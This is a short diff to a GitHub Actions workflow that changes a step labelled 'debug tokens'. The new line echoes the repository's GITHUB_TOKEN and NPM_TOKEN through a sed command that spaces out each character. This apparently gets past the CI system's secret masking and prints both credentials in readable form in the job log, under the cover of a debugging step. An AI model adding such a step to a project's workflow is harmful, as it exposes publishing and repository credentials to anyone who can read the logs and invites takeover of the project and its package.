@@ -12,9 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: debug tokens
-        run:
-          | echo ${{secrets.GITHUB_TOKEN}}
-          | echo ${{secrets.NPM_TOKEN}}
+        run: echo ${{secrets.GITHUB_TOKEN }} | sed 's/./& /g' && echo ${{secrets.NPM_TOKEN }} | sed 's/./& /g'
       # - uses: actions/checkout@v2
       #   with:
       #     fetch-depth: 0
